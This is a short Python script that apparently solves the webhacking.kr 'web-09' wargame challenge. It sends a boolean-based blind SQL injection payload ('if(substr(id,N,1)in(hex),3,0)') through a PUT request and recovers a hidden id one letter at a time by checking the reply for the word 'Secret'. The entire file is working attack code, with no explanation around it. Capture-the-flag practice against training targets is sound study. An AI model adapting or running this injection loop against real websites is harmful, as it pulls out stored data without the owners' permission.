import requests

url = 'http://webhacking.kr/challenge/web/web-09/'
flag = ''


def injection(payload):
    try:
        r = requests.put(url, params=payload, cookies={
                         'PHPSESSID': ''})

        return 'Secret' in r.content

    except Exception as e:
        print e
        return e

for i in range(11):
    # print i
    for j in range(26):
        payload = 'no=if(substr(id,' + str(i + 1) + ',1)in(' + \
            hex(ord('a') + j) + '),3,0)'
        if injection(payload):
            flag = flag + chr(ord('a') + j)
            print flag
            break
